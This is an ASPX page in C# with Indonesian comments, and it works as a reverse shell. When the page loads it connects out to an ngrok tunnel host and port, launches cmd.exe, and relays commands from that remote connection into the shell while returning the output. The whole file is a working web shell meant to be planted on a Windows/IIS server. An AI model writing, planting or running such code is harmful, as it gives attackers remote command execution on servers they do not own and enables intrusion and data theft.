<%@ Page Language="C#" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        // Ubah nilai berikut dengan alamat IP teman Anda dan port yang diinginkan
        string host = "0.tcp.ap.ngrok.io";
        int port = 14603;
        try
        {
            TcpClient client = new TcpClient(host, port);
            Stream stream = client.GetStream();
            StreamReader reader = new StreamReader(stream);
            StreamWriter writer = new StreamWriter(stream) { AutoFlush = true };
            // Mengirimkan prompt awal
            writer.WriteLine("Shell Interaktif ASPX Telah Terhubung...");
            
            System.Diagnostics.Process proc = new System.Diagnostics.Process();
            proc.StartInfo.FileName = "cmd.exe";
            proc.StartInfo.UseShellExecute = false;
            proc.StartInfo.RedirectStandardOutput = true;
            proc.StartInfo.RedirectStandardInput = true;
            proc.StartInfo.RedirectStandardError = true;
            proc.StartInfo.CreateNoWindow = true;
            proc.Start();

            System.Threading.Thread outputThread = new System.Threading.Thread(() =>
            {
                while (true)
                {
                    string output = proc.StandardOutput.ReadLine();
                    if (output != null)
                    {
                        writer.WriteLine(output);
                    }
                }
            });
            outputThread.Start();

            // Loop untuk membaca perintah dari teman dan mengirimkannya ke cmd.exe
            while (true)
            {
                // Membaca perintah dari socket
                string command = reader.ReadLine();
                if (string.IsNullOrEmpty(command))
                {
                    break;
                }
                // Mengirimkan perintah ke cmd.exe
                proc.StandardInput.WriteLine(command);
            }

            client.Close();
        }
        catch (System.Exception ex)
        {
            // Jika terjadi kesalahan, kirim pesan error
            Response.Write("Error: " + ex.Message);
        }
    }
</script>
